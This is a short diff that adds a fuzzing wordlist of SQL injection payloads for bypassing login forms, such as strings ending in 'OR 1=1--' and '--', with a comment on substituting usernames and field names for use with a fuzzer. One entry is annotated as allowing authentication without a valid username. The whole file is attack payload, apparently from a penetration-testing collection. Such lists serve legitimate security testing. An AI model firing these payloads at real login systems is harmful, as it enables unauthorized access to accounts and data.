@@ -1,0 +1,6 @@
+# regex replace as many as you can with your fuzzer for best results:
+# <user-fieldname> <pass-fieldname> <username>
+<username>' OR 1=1--
+'OR '' = '	Allows authentication without a valid username.
+<username>'--
+'OR 1=1--
